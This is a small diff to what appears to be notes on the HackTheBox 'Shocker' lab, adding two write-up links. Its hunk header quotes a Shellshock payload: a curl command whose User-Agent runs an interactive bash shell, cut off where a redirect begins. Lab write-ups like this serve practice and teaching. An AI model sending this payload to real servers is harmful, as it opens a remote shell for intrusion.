@@ -56,3 +56,5 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + https://infosecwriteups.com/shocker-from-hackthebox-52378519fb5b
 + https://corruptedprotocol.medium.com/shocker-hackthebox-htb-2cdac3cf3562
 + https://www.linkedin.com/pulse/hack-box-htb-shocker-walkthrough-abdulhakim-öner
++ https://medium.com/@orhan_yildirim/shocker-hackthebox-write-up-538631df688f
++ https://brcyrr.medium.com/hack-the-box-shocker-602ea7452797
